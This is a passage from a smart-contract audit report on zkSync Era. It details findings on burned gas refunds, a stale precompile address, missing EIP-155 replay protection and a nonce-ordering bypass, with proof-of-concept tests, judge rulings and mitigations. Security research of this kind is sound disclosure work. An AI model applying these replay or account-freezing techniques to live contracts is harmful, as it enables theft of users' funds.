[Mailbox.requestL2Transaction:L236-L245](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L236-L245)

An important param is `_l2TxGasLimit`, which is used to process the TX on L2. The L2 gas limit should include both the overhead for processing the batch and the L2 gas needed to process the transaction itself (i.e. the actual `l2GasLimit` that will be used for the transaction).

So, `_l2TxGasLimit` should have an amount that's enough to cover:

1.  Transaction overhead.
2.  The transaction itself (body execution).

To ensure this, there is a validation enforced on `requestL2Transaction` before pushing the TX to the `priorityQueue`.

```solidity
	L2CanonicalTransaction memory transaction = _serializeL2Transaction(_priorityOpParams, _calldata, _factoryDeps);

	bytes memory transactionEncoding = abi.encode(transaction);

	TransactionValidator.validateL1ToL2Transaction(transaction, transactionEncoding, s.priorityTxMaxGasLimit);
```

[Mailbox.\_writePriorityOp:L361-L368](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L361-L368)

This is to make sure the transaction at least get a chance to be executed.

### Bootloader ``L1->L2`` TX execuation flow

When the bootloader receives the ``L1->L2`` TX, it does the following:

1. Calculates the L2 gas limit for the transaction's body, i.e. without intrinsic costs and overhead.

```solidity
	let gasLimitForTx, reservedGas := getGasLimitForTx(
		innerTxDataOffset, 
		transactionIndex, 
		gasPerPubdata, 
		L1_TX_INTRINSIC_L2_GAS(), 
		L1_TX_INTRINSIC_PUBDATA()
	)
```

[bootloader:L878-L884](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L878-L884)

**gasLimitForTx** - is the gas limit for the transaction's body.<br>
**reservedGas** - is the amount of gas that is beyond the operator's trust limit to refund it back later.

Note: the operator's trust limit is guaranteed to be at least `MAX_GAS_PER_TRANSACTION` which is at the moment `80000000` (check `SystemConfig.json`).

2. Ensure that the deposited eth covers `txInternalCost` and `value`.

```solidity
	let gasPrice := getMaxFeePerGas(innerTxDataOffset)
	let txInternalCost := safeMul(gasPrice, gasLimit, "poa")
	let value := getValue(innerTxDataOffset)
	if lt(getReserved0(innerTxDataOffset), safeAdd(value, txInternalCost, "ol")) {
		assertionError("deposited eth too low")
	}
```

[bootloader:L901-L906](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L901-L906)

3.  Checks if **gasLimitForTx** is greater than `gasUsedOnPreparation` and then calls `getExecuteL1TxAndGetRefund` to attempt to execute the TX. This function returns a `potentialRefund` if there is any.

```solidity
		if gt(gasLimitForTx, gasUsedOnPreparation) {
			let potentialRefund := 0

			potentialRefund, success := getExecuteL1TxAndGetRefund(txDataOffset, sub(gasLimitForTx, gasUsedOnPreparation))

```

[bootloader:L908-L912](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L908-L912)

For example, let's say the sender has `10_000_000` gas limit (after deducting the overhead ..etc.), and the TX execution consumed `3_000_000`, then the `potentialRefund` is supposed to be `10_000_000-3_000_000 = 7_000_000`. This will be returned to `refundRecipient`. However, if the actual TX execution fails, then `potentialRefund` will always be zero. Therefore, no refund for the sender at all. In other words, let's say that the TX execution consumed only `500_000` only till it reverted (for whatever reason). so, the `potentialRefund` should be `9_500_000` which is not the case since it will be always zero on failure.

Note: obviously this is not applicable if ``L1->L2`` transactions were set to be free. [Check the comments here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L927-L931).

### Reason & Explanation

This issue occurs due to the fact that near call opcode is used to execute the TX (to avoid 63/64 rule), and when the TX execution fails, near call panic is utilised to avoid reverting the bootloader and to revert minting ether to the user.

```solidity
	let gasBeforeExecution := gas() 
	success := ZKSYNC_NEAR_CALL_executeL1Tx(
		callAbi,
		txDataOffset
	)
```

[bootloader:L980-L988](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L980-L988)

```solidity
	// If the success is zero, we will revert in order
	// to revert the minting of ether to the user
	if iszero(success) {
		nearCallPanic()
	}
```

[bootloader:L1665-L1670](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1665-L1670)

Check [zkSync specific opcodes: Generally accessible](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/System%20contracts%20bootloader%20description.md#generally-accessible),

> `near_call`. It is basically a “framed” jump to some location of the code of your contract. The difference between the `near_call` and ordinary jump are:
> 
> - It is possible to provide an `ergsLimit` for it. Note, that unlike `“far_call”s` (i.e. calls between contracts) the 63/64 rule does not apply to them.
> - If the near call frame panics, all state changes made by it are reversed. Please note, that the memory changes will not be reverted.

Please note that the only way to revert only the `near_call` frame (and not the parent) is to trigger out of gas error or invalid opcode.

Check [Simulations via our compiler: Simulating `near_call` (in Yul only)](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/System%20contracts%20bootloader%20description.md#simulations-via-our-compiler)

> Important note: the compiler behaves in a way that if there is a revert in the bootloader, the `ZKSYNC_CATCH_NEAR_CALL` is not called and the parent frame is reverted as well. The only way to revert only the `near_call` frame is to trigger VM’s panic (it can be triggered with either invalid opcode or out of gas error).

In  `ZKSYNC_NEAR_CALL_executeL1Tx`,  `nearCallPanic()` is called in case of TX failure. If we check `nearCallPanic()` function, we find that it exhausts all the gas of the current frame so that out of gas error is triggered.

```solidity
	/// @dev Used to panic from the nearCall without reverting the parent frame.
	/// If you use `revert(...)`, the error will bubble up from the near call and
	/// make the bootloader to revert as well. This method allows to exit the nearCall only.
	function nearCallPanic() {
		// Here we exhaust all the gas of the current frame.
		// This will cause the execution to panic.
		// Note, that it will cause only the inner call to panic.
		precompileCall(gas())
	}
```

[bootloader:L1678-L1686](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1678-L1686)

Because of this, no matter how much gas was spent on the TX itself, if it fails, all the unused remaining gas will be burned.

According to the docs [zkSync: Batch overhead & limited resources of the batch](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/zkSync%20fee%20model.md#batch-overhead--limited-resources-of-the-batch) the refund should be provided at the end of the transaction.

> Note, that before the transaction is executed, the system can not know how many of the limited system resources the transaction will actually take, so we need to charge for the worst case and provide the refund at the end of the transaction

**On the surface, this might not look like a critical issue since the lost funds are relatively small. However, this may be true for normal or small transactions unlike computationally intensive tasks which may require big upfront payment. The lost funds will be not negligible.**

Please refer to [How baseFee works on zkSync](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/zkSync%20fee%20model.md#how-basefee-works-on-zksync)

> This does not actually matter a lot for normal transactions, since most of the costs will still go on pubdata for them. However, it may matter for computationally intensive tasks, meaning that for them a big upfront payment will be required, with the refund at the end of the transaction for all the overspent gas.

Please note that while there is `MAX_TRANSACTION_GAS_LIMIT` for the `gasLimit`, it may go way beyond the `MAX_TRANSACTION_GAS_LIMIT` (since the contracts can be 10s of kilobytes in size). This is called Trusted gas limit which is provided by the operator.

Please check [Trusted gas limit](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/zkSync%20fee%20model.md#trusted-gas-limit)

> the operator may provide the trusted gas limit, i.e. the limit which exceeds `MAX_TRANSACTION_GAS_LIMIT` assuming that the operator knows what he is doing (e.g. he is sure that the excess gas will be spent on the pubdata).

From this, we conclude that the upper limit for the loss is the cost of the `gaslimit` provided by the user which could possibly be a big amount of payment to cover complex tasks (assuming the operator provided a trusted gas limit bigger or equal to `gaslimit` provided by the user).

It's worth mentioning, that this breaks the trust assumptions that the users have, since the users assume that they will always get a refund if it wasn't consumed by their requested TX.

For the reasons explained above, I've set the severity to high.

### Proof of Concept

We have one test file. This file demonstrates two cases:
1. `test_actual_gas_spent_on_success()` - When the TX succeed, the potential refund holds the actual remaining gas to be refunded.
2. `test_no_gas_refund_on_failure` - When the TX fails, the potential refund is zero.

Important notes:
- While the test is not executed via zkEVM, the only specific opcode for this PoC is, the near call panic. For this reason, it is simulated.
- The code is written in solidity for simplicity. However, for this PoC, it is good enough to demonstrate and prove the issue.

To run the test file:
```sh
forge test --via-ir -vv
```

You should get the following output:

```sh
[PASS] test_actual_gas_spent_on_success() (gas: 47121)
Logs:
  Nearcall callAbi: 100000000
  gasSpentOnExecution: 31533
  success:  true
  potentialRefund: 99968467

[PASS] test_no_gas_refund_on_failure() (gas: 101606767)
Logs:
  Nearcall callAbi: 100000000
  gasSpentOnExecution: 101591221
  success:  false
  potentialRefund: 0

Test result: ok. 2 passed; 0 failed; finished in 604.85ms
```

### Test File

<details> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// PoC => No refund for gas on `L1->L2` tx failure, it always burns the gas even if not used

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

import {DSTest} from "ds-test/test.sol";

uint256 constant OVERHEAD_TX = 100_000; // assume overhead as 100000
uint256 constant GAS_PREP = 2000; // assume preparation value

contract ExternalContract {
    uint256 varState;

    function doSomething(uint256 num) external {
        varState = 1;

        //  revert if num is zero to cause nearCallPanic later
        if (num == 0) {
            revert("something wrong happened");
        }
    }
}

interface IExternalContract {
    function doSomething(uint256 num) external;
}

interface IBooloaderMock {
    function ZKSYNC_NEAR_CALL_SIMULATION_executeL1Tx(
        uint256 callAbi,
        bytes memory txCalldataEncoded
    ) external;
}

contract BooloaderMock {
    ExternalContract externalContract;

    constructor() {
        externalContract = new ExternalContract();
    }

    /// @dev The overhead in gas that will be used when checking whether the context has enough gas, i.e.
    /// when checking for X gas, the context should have at least X+CHECK_ENOUGH_GAS_OVERHEAD() gas.
    function CHECK_ENOUGH_GAS_OVERHEAD() internal pure returns (uint256 ret) {
        ret = 1000000;
    }

    function checkEnoughGas(uint256 gasToProvide) internal view {
        // Using margin of CHECK_ENOUGH_GAS_OVERHEAD gas to make sure that the operation will indeed
        // have enough gas
        // CHECK_ENOUGH_GAS_OVERHEAD => 1_000_000
        if (gasleft() < (gasToProvide + CHECK_ENOUGH_GAS_OVERHEAD())) {
            revert("No enough gas");
        }
    }

    function notifyExecutionResult(bool success) internal {}

    function nearCallPanic() internal pure {
        // Here we exhaust all the gas of the current frame.
        // This will cause the execution to panic.
        // Note, that it will cause only the inner call to panic.
        uint256 x = 0;
        while (true) {
            x += 1;
        }
    }

    // simulation of near call
    function ZKSYNC_NEAR_CALL_SIMULATION_executeL1Tx(
        uint256 callAbi,
        bytes memory txCalldataEncoded
    ) public {
        (bool success, ) = address(externalContract).call{gas: callAbi}(
            txCalldataEncoded
        );

        if (!success) {
            // nearCall panic
            nearCallPanic();
        }
    }

    function getExecuteL1TxAndGetRefund(
        uint256 gasForExecution,
        bytes memory txCalldataExternalContract
    ) internal returns (uint256 potentialRefund, bool success) {
        uint256 callAbi = gasForExecution;

        checkEnoughGas(gasForExecution);

        uint256 gasBeforeExecution = gasleft();

        bytes memory txCalldataEncoded = abi.encodeCall(
            IBooloaderMock.ZKSYNC_NEAR_CALL_SIMULATION_executeL1Tx,
            (callAbi, txCalldataExternalContract)
        );

        console.log("Nearcall callAbi: %d", callAbi);
        // pass 64/63 to simulate nearCall that doesn't follow this 63/64 rule
        uint256 fullGas = (callAbi * 64) / 63;
        (success, ) = address(this).call{gas: fullGas}(txCalldataEncoded);

        notifyExecutionResult(success);
        uint256 gasSpentOnExecution = gasBeforeExecution - gasleft();
        console.log("gasSpentOnExecution: %d", gasSpentOnExecution);
        if (gasSpentOnExecution <= gasForExecution) {
            potentialRefund = gasForExecution - gasSpentOnExecution;
        }
    }

    function processL1Tx(
        uint256 l2ValueProvidedByUser,
        uint256 gasLimitProvidedByUser,
        bytes memory txCalldataExternalContract
    ) external payable returns (uint256 potentialRefund, bool success) {
        uint256 overheadTX = OVERHEAD_TX; // assume overhead for simplicity
        uint256 gasLimitForTx = gasLimitProvidedByUser - overheadTX;
        uint256 gasUsedOnPreparation = GAS_PREP; // assume preparation value simplicity
        uint256 gasLimit = gasLimitProvidedByUser;

        uint256 gasPrice = 13e9;
        uint256 txInternalCost = gasPrice * gasLimit;
        require(
            msg.value >= l2ValueProvidedByUser + txInternalCost,
            "deposited eth too low"
        );
        require(gasLimitForTx > gasUsedOnPreparation, "Tx didn't continue");

        (potentialRefund, success) = getExecuteL1TxAndGetRefund(
            (gasLimitForTx - gasUsedOnPreparation),
            txCalldataExternalContract
        );
    }
}

contract BootloaderMockTest is DSTest, Test {
    BooloaderMock bootloaderMock;

    function setUp() public {
        bootloaderMock = new BooloaderMock();
        vm.deal(address(this),100 ether);
    }

    function test_no_gas_refund_on_failure() public {
        uint256 gasLimitByUser = 100_000_000 + OVERHEAD_TX + GAS_PREP;
        uint256 l2Value = 0;
        bytes memory txCalldataExternalContract = abi.encodeCall(
            IExternalContract.doSomething,
            (0) // value 0 cause the call to fail
        );
        (uint256 potentialRefund, bool success) = bootloaderMock.processL1Tx{
            value: 10 ether
        }(l2Value, gasLimitByUser, txCalldataExternalContract);
        console.log("success: ", success);
        console.log("potentialRefund: %d", potentialRefund);
    }

    function test_actual_gas_spent_on_success() public {
        uint256 gasLimitByUser = 100_000_000 + OVERHEAD_TX + GAS_PREP;
        uint256 l2Value = 0;
        bytes memory txCalldataExternalContract = abi.encodeCall(
            IExternalContract.doSomething,
            (1) // value 1 makes the call successful
        );
        (uint256 potentialRefund, bool success) = bootloaderMock.processL1Tx{
            value: 10 ether
        }(l2Value, gasLimitByUser, txCalldataExternalContract);
        console.log("success: ", success);
        console.log("potentialRefund: %d", potentialRefund);
    }
}
```

</details>

### Recommended Mitigation Steps

One suggestion is to use invalid opcode instead of burning gas.

**[miladpiri (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/979#issuecomment-1794734112):**
 > It is Low. The user does indeed lose all the gas if success is false, as we invoke the `nearCallPanic` that burns all the gas in the near call (which is basically all the execution gas).

**[Alex the Entreprenerd (judge) decreased severity to QA and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/979#issuecomment-1826777382):**
 > I believe the design decision makes sense, a ``L1->L2`` must consume all gas as otherwise computing the refunds would be ripe for exploitation.

**[koolexcrypto (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/979#issuecomment-1837508334):**
 > 
> @Alex the Entreprenerd - I kindly ask you to re-evaluate the issue above considering the following:
> 
> **EVM non-equivalence** 
>
>  If you check the [differences from Ethereum at zkSync docs](https://era.zksync.io/docs/reference/architecture/differences-with-ethereum.html), EVM REVERT instruction is not listed. Meaning that, REVERT behaviour in zkSync Era VM should behave exactly the same as in EVM. Here is a simple summary of how the [EIP-140](https://eips.ethereum.org/EIPS/eip-140) defines the REVERT instruction: 
>  > The REVERT instruction provides a way to stop execution and revert state changes, without consuming all provided gas and with the ability to return a reason.
> 
> The REVERT instruction behaviour is also confirmed in the [ZkSync Era Virtual Machine primer document](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/VM%20Section/ZkSync%20Era%20Virtual%20Machine%20primer.md#return-revert-panic) which says:
> > Revert: a recoverable error happened. Unspent gas is returned to the caller, which will execute the exception handler. The instruction is revert.
> 
> However, it is not the case as demonstrated in the issue above. This is due to the fact that when a TX (requested from L1) fails due to a REVERT opcode in the contract code of the callee, all the remaining gas (from the actual execution gas) will be always consumed. This behaviour is similar to the deprecated/removed opcode `throw` from EVM.
> 
> **EVM Behaviour Discrepancy**
>
> Assume we have:
> - **User X** - who is the caller.
> - **Contract C** - on L2 which is the callee and has **Function F**.
> - **Function F** - which consists of 1000 lines of code. However at line 4, there is a revert.
> 
> Let's check two scenarios:
> 
> 1. **User X** calls **Function F** by sending an L2 TX directly, at line 4, the execution finishes due to the revert and all unspent gas is returned to the caller.
> 2. **User X** calls the same function **Function F** by sending an L2 TX indirectly (i.e. requested from L1), at line 4, the execution stops due to the revert and all unspent gas is consumed anyway.
> 
> In the first scenario, REVERT behaves exactly as expected.
> In the second scenario, REVERT behaves as if it was the deprecated/removed opcode `throw`. *Please note that we are talking here about the actual execution gas.*
>
> From this, we can see how the Bootloader breaks the zkSync Era VM  consistency
> 
> **zkSync Era's fee model**
> 
> Some distinctive feature of zkSync Era's fee model is the abundance of refunds for **unused limited system resources** and **overpaid computation**. Please check [High-level: conclusion](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/zkSync%20fee%20model.md#high-level-conclusion) which says:
> > The other distinctive feature of the fee model used on zkSync is the abundance of refunds, i.e.:
> > - For unused limited system resources.
> > - For overpaid computation.
> 
> Also, In the [Fee mechanism](https://era.zksync.io/docs/reference/concepts/fee-model.html) docs which says:
> > zkSync Era's fee model is similar to Ethereum’s where gas is charged for computational cost, cost of publishing data on-chain and storage effects.
> 
> The above issue shows how the implementation is not aligned with this design since it charges for opcodes that were never executed (i.e. opcodes that happen to be after a REVERT). Therefore, no resources have been used for it.
> 
> In the light of this basis, the unspent gas should be returned to the user especially when the user can not influence the relevant logic in the bootloader by any mean. In other words, we have 4 actors:
> 1. Caller
> 2. Callee
> 3. Operator
> 4. zkSync Era VM
> 
> When the caller sends an L2 TX (from L1), It seems that the caller can not provide any input that could prevent the issue from occuring.
> 
> Lastly, it breaks the trust assumption that the users (or protocols) have, since they assume that they will receive back their unspent gas from the actual execution gas since it wasn't consumed by the TX.

**[Alex the Entreprenerd (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/979#issuecomment-1849046921):**
 > I went back and forth on this finding a bit because:
> - It's impossible to determine what a reverted transaction should have cost.
> - Meaning that it's impossible for zkSync to calculate the refund based on the fair value of the expected tx cost.
> - However, it is fair to expect that just like a normal revert, the cost paid would be capped at the gas spent and not at the gas set as limit.
> 
> Due to this, the finding can be interpreted as saying that:
> ``L1->L2`` txs that revert will consume all gas. With this being inconsistent for the EVM, and potentially risky for end users, I agree with Medium Severity
>
> The gas used is known and a refund could be computed, which is, in my opinion, inconsistent with other behaviours of the system. I understand the Sponsor may elect for a nofix, and that this would be a warning to developers/end-users/integrators.

***

## [[M-04] Incorrect max precompile address](https://github.com/code-423n4/2023-10-zksync-findings/issues/888)
*Submitted by [zero-idea](https://github.com/code-423n4/2023-10-zksync-findings/issues/888), also found by [0xTheC0der](https://github.com/code-423n4/2023-10-zksync-findings/issues/1138), [0xstochasticparrot](https://github.com/code-423n4/2023-10-zksync-findings/issues/961), [Audittens](https://github.com/code-423n4/2023-10-zksync-findings/issues/799), [Jeiwan](https://github.com/code-423n4/2023-10-zksync-findings/issues/772), [leviticus1129](https://github.com/code-423n4/2023-10-zksync-findings/issues/673), [lsaudit](https://github.com/code-423n4/2023-10-zksync-findings/issues/541), [gumgumzum](https://github.com/code-423n4/2023-10-zksync-findings/issues/537), [0x1337](https://github.com/code-423n4/2023-10-zksync-findings/issues/472), [quarkslab](https://github.com/code-423n4/2023-10-zksync-findings/issues/380), [erebus](https://github.com/code-423n4/2023-10-zksync-findings/issues/254), [rvierdiiev](https://github.com/code-423n4/2023-10-zksync-findings/issues/184), and [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/142)*

Two new precompiles have been introduced (`ECADD` and `ECMUL`) without updating the pointer that indicates the current maximum precompile address (`CURRENT_MAX_PRECOMPILE_ADDRESS`), causing these new precompiles to not be considered as precompiles in the system.

### Impact

The updated revision of ZkSync Era has introduced two new precompiles, `ECADD` and `ECMUL` at addresses `0x06` and `0x07`, respectively.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Constants.sol#L27-L28>

```solidity
27: address constant ECADD_SYSTEM_CONTRACT = address(0x06);
28: address constant ECMUL_SYSTEM_CONTRACT = address(0x07);
```

Their implementation is available in `code/system-contracts/contracts/precompiles/EcAdd.yul` and `code/system-contracts/contracts/precompiles/EcMul.yul`.

Precompile addresses are tracked by a constant named `CURRENT_MAX_PRECOMPILE_ADDRESS`, which points to the maximum address that is a precompile. The intention here is to have a way to determine if an address is a precompile, i.e. `precompile <=> address <= CURRENT_MAX_PRECOMPILE_ADDRESS`.

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Constants.sol#L35>

```solidity
35: uint256 constant CURRENT_MAX_PRECOMPILE_ADDRESS = uint256(uint160(SHA256_SYSTEM_CONTRACT));
```

Note that the implementation still points to the old maximum precompile, which was `SHA256` at address `0x02`. This means that both `ECADD` and `ECMUL` won't be considered as precompiles, this is because their address are greater than the `CURRENT_MAX_PRECOMPILE_ADDRESS`, breaking the invariant.

Particularly, this impacts the `getCodeHash()` function in `AccountCodeStorage`. The function follows the assumption that a precompile is under the `CURRENT_MAX_PRECOMPILE_ADDRESS` constant in order to return the hash of the empty string (`EMPTY_STRING_KECCAK`).

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/AccountCodeStorage.sol#L89-L95>

```solidity
89:     function getCodeHash(uint256 _input) external view override returns (bytes32) {
90:         // We consider the account bytecode hash of the last 20 bytes of the input, because
91:         // according to the spec "If EXTCODEHASH of A is X, then EXTCODEHASH of A + 2**160 is X".
92:         address account = address(uint160(_input));
93:         if (uint160(account) <= CURRENT_MAX_PRECOMPILE_ADDRESS) {
94:             return EMPTY_STRING_KECCAK;
95:         }
...
```

As both `ECADD` and `ECMUL` are greater than `CURRENT_MAX_PRECOMPILE_ADDRESS`, the implementation of `getCodeHash()` will return zero instead of the expected `EMPTY_STRING_KECCAK` constant, as other precompiles do.

### Proof of Concept

The following test asks the `AccountCodeStorage` contract for the code hash of the new precompiles. The expected value should be the keccak hash of the empty string.

```typescript
describe('AccountCodeStorage', function() {
    it('fails to return correct hash for ECADD precompile', async () => {
        expect(await accountCodeStorage.getCodeHash('0x0000000000000000000000000000000000000006')).to.be.eq(
            EMPTY_STRING_KECCAK
        );
    });
    
    it('fails to return correct hash for ECMUL precompile', async () => {
        expect(await accountCodeStorage.getCodeHash('0x0000000000000000000000000000000000000007')).to.be.eq(
            EMPTY_STRING_KECCAK
        );
    });
});
```

The expected results from these tests fail:

      Audit tests
        AccountCodeStorage
          1) fails to return correct hash for ECADD precompile
          2) fails to return correct hash for ECMUL precompile


      0 passing (256ms)
      2 failing

      1) Audit tests
           AccountCodeStorage
             fails to return correct hash for ECADD precompile:

          AssertionError: expected '0x00000000000000000000000000000000000…' to equal '0xc5d2460186f7233c927e7db2dcc703c0e50…'
          + expected - actual

          -0x0000000000000000000000000000000000000000000000000000000000000000
          +0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470

          at Context.<anonymous> (test/Audit.spec.ts:33:110)
          at processTicksAndRejections (node:internal/process/task_queues:96:5)

      2) Audit tests
           AccountCodeStorage
             fails to return correct hash for ECMUL precompile:

          AssertionError: expected '0x00000000000000000000000000000000000…' to equal '0xc5d2460186f7233c927e7db2dcc703c0e50…'
          + expected - actual

          -0x0000000000000000000000000000000000000000000000000000000000000000
          +0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470

          at Context.<anonymous> (test/Audit.spec.ts:39:110)
          at processTicksAndRejections (node:internal/process/task_queues:96:5)

### Recommendation

Update the `CURRENT_MAX_PRECOMPILE_ADDRESS` pointer to include the new precompile addresses.

```diff
-    uint256 constant CURRENT_MAX_PRECOMPILE_ADDRESS = uint256(uint160(SHA256_SYSTEM_CONTRACT));
+    uint256 constant CURRENT_MAX_PRECOMPILE_ADDRESS = uint256(uint160(ECMUL_SYSTEM_CONTRACT));
```

**[miladpiri (zkSync) confirmed and commented via duplicate issue #142](https://github.com/code-423n4/2023-10-zksync-findings/issues/142#issuecomment-1794953393):**
> Valid finding. Medium is fair.

***

## [[M-05] EIP-155 is not enforced, allowing attackers/malicious operators to profit from replaying transactions](https://github.com/code-423n4/2023-10-zksync-findings/issues/882)
*Submitted by [OffsideLabs](https://github.com/code-423n4/2023-10-zksync-findings/issues/882), also found by [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/569) and [ustas](https://github.com/code-423n4/2023-10-zksync-findings/issues/154)*

### Lines of code

<https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/libraries/TransactionHelper.sol#L183-L187><br>
<https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/DefaultAccount.sol#L78-L107>

### Vulnerability details

The L2 `DefaultAccount.validateTransaction` function and transaction encoding process in the bootloader do not enforce EIP-155. If the `reserved[0]`  of the legacy tx is zero, the EIP-155 will be disabled. The chainId will not be included in the transaction signature.

```solidity
        bytes memory encodedChainId;
        if (_transaction.reserved[0] != 0) {
            encodedChainId = bytes.concat(RLPEncoder.encodeUint256(block.chainid), hex"80_80");
        }
```

### Impact

There are two potential exploitation scenarios:
1. A malicious attacker can replay transactions from the mainnet or other networks not protected by EIP-155. While there are very few EVM networks currently supporting transactions without EIP-155, attackers still have an opportunity to profit by replaying early transactions from other networks. For example, if an early ETH user A sent a legacy tx to user B before EIP-155 enabled, and now user A deposited some ETH into the zkSync era network, then user B could replay the early transaction from user A to steal his funds on the zkSync network.
2. Operators can replay early user transactions from eth/other EVM networks to collect gas fees or even profit directly.

### Proof of Concept

EIP-155 will be disabled when the following two conditions are met:
1. Transaction type is legacy tx, which `tx_type=0`.
2. `tx.reserved[0] == 0`.

The value of the reserved field cannot be set arbitrarily, but if the user inputs a transaction with `tx_type=0` and the `v` in the signature is 27 or 28, then `reserved[0]` will be set to `0`.

Code [here](https://github.com/matter-labs/zksync-era/blob/6cb8c2c350385ed96c0824869a885a7285735a91/core/lib/vm/src/types/internals/transaction_data.rs#L52-L60).

```rust
                let should_check_chain_id = if matches!(
                    common_data.transaction_type,
                    TransactionType::LegacyTransaction
                ) && common_data.extract_chain_id().is_some()
                {
                    U256([1, 0, 0, 0])
                } else {
                    U256::zero()
                };
```

```rust
    pub fn extract_chain_id(&self) -> Option<u64> {
        let bytes = self.input_data()?;
        let chain_id = match bytes.first() {
            Some(x) if *x >= 0x80 => {
                let rlp = Rlp::new(bytes);
                let v = rlp.val_at(6).ok()?;
                PackedEthSignature::unpack_v(v).ok()?.1?
            }
```

### Recommended Mitigation Steps

Enforce EIP-155 signature verification in the contract `DefaultAccount.validateTransaction`.

**[miladpiri (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/882#issuecomment-1794660244):**
 > This is a design decision. So, QA.

**[Alex the Entreprenerd (judge) decreased severity to QA and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/882#issuecomment-1824841175):**
 > This is an option, not the default.

**[Alex the Entreprenerd (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/882#issuecomment-1887439561):**
 > I have spent time investigating this issues impact and why this is considered "acceptable". I believe that a clear divide between Developers and Security Researchers can be seen in how the severity is interpreted for this issue.
>
> Any "EVM Developer" will look at this finding as trivial, and obvious, "it's the user fault" for having a wallet that is pre EIP-155 and the usage of this signature scheme are keyless deployments. Any security researcher will look at this as a means to DOS users, and potentially steal their funds.
> 
> I have spoken with a lot of different actors in the security space and have heard every possible severity for this type of findings, from known to high severity.
> 
> After talking with 4 different judges, am going to set the finding as Medium severity. As zkSync is not uniquely subjected to this finding, I believe the finding to be a danger to end users which should be publicly disclosed to them.

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/882).*

***

## [[M-06] Nonce ordering of EOA can be updated to "arbitrary" through an L1 tx](https://github.com/code-423n4/2023-10-zksync-findings/issues/861)
*Submitted by [xuwinnie](https://github.com/code-423n4/2023-10-zksync-findings/issues/861)*

Nonce order of an EOA should always be sequential, otherwise the transaction cannot be validated. The default account does not allow user to call function `updateNonceOrdering` of ContractDeployer. However, the restriction can be bypassed if user call `updateNonceOrdering` through an L1 priority transaction. As a result, the user's account will be permanently frozen.

### Proof of Concept

    function _validateTransaction(
        bytes32 _suggestedSignedHash,
        Transaction calldata _transaction
    ) internal returns (bytes4 magic) {
        // Note, that nonce holder can only be called with "isSystem" flag.
        SystemContractsCaller.systemCallWithPropagatedRevert(
            uint32(gasleft()),
            address(NONCE_HOLDER_SYSTEM_CONTRACT),
            0,
            abi.encodeCall(INonceHolder.incrementMinNonceIfEquals, (_transaction.nonce))
        );

    function incrementMinNonceIfEquals(uint256 _expectedNonce) external onlySystemCall {
        uint256 addressAsKey = uint256(uint160(msg.sender));
        uint256 oldRawNonce = rawNonces[addressAsKey];

        (, uint256 oldMinNonce) = _splitRawNonce(oldRawNonce);
        require(oldMinNonce == _expectedNonce, "Incorrect nonce");

        unchecked {
            rawNonces[addressAsKey] = oldRawNonce + 1;
        }
    }

`incrementMinNonceIfEquals` is used in `_validateTransaction`. It always uses a sequential nonce.

            // Checks whether the nonce `nonce` have been already used for 
            // account `from`. Reverts if the nonce has not been used properly.
            function ensureNonceUsage(from, nonce, shouldNonceBeUsed) {
                // INonceHolder.validateNonceUsage selector
                mstore(0, {{RIGHT_PADDED_VALIDATE_NONCE_USAGE_SELECTOR}})
